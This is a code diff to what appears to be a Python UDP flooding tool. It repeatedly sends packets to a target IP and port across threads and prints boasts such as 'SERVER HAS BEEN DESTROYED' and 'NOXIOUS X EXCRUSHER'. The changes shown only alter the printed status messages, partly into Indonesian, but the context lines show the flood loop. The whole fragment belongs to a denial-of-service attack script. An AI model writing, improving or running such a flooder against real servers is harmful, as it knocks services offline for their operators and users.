@@ -23,7 +23,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" | NOXIOUS |")
+			print(i +" | SEDANG MENGIRIM KEJUTAN... |")
 		except:
 			print("[!] | SERVER HAS BEEN DESTROYED |")
 
@@ -40,7 +40,7 @@ def run2():
 			print(i +" NOXIOUS X EXCRUSHER")
 		except:
 			s.close()
-			print("[*] |PAKETSEDANG OTW|")
+			print("[*] |PAKET SEDANG OTW|")
 
 for y in range(threads):
 	if choice == 'y':
